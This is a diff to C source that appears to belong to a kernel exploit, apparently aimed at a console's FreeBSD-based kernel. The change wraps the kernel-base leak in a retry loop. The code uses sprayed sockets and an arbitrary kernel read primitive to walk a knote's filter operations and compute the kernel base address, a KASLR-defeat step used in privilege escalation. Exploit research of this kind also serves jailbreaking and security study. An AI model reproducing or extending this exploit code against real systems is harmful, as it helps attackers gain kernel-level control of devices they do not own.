@@ -462,14 +462,14 @@ int main(int x)
     if(victim < 0)
         return 1;
     victim = spray_sock[victim];
-    unsigned long long knote, kn_fop, f_detach, kernel_base;
-    /*do
-    {*/
+    unsigned long long knote, kn_fop, f_detach, kernel_base = 1;
+    for(int i = 0; i < 10 && kernel_base & 4095ull; i++)
+    {
         knote = kread64(&o, victim, ptrs[0] + kevent_sock * 8);
         kn_fop = kread64(&o, victim, knote + offsetof(struct knote, kn_fop));
         f_detach = kread64(&o, victim, kn_fop + offsetof(struct filterops, f_detach));
         kernel_base = f_detach - F_DETACH_OFFSET;
-    //}
+    }
     if(kernel_base & 4095ull)
     {
         printf("error: kernel base mismatch: 0x%llx! (buggy arb r/w? wrong fw?)\n", kernel_base);
